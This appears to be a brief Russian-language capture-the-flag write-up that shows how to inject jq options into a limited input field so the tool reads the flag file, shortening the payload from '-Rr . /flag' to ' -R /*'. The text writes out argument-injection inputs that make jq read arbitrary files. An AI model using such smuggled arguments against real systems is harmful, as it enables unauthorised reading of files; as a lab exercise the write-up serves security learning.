Jq может читать содержимое файлов, если выполняются три условия:
 - указаны опции `R` и/или `r`;
 - указан фильтр `.`;
 - указан файл, который необходимо прочитать.

Пример:
```
jq ''-Rr . /flag'' test.json
```

Таким образом, чтобы прочитать флаг, нужно ввести:
```
'-Rr . /flag'
```
Однако, количество символов во вводе ограничено.

Чтобы сократить инпут, можем заменить `/flag` на `/*`:
```
'-Rr . /*'
```

Удалив опцию `-r`, можем сократить инпут еще больше:
```
' -R /*'
```
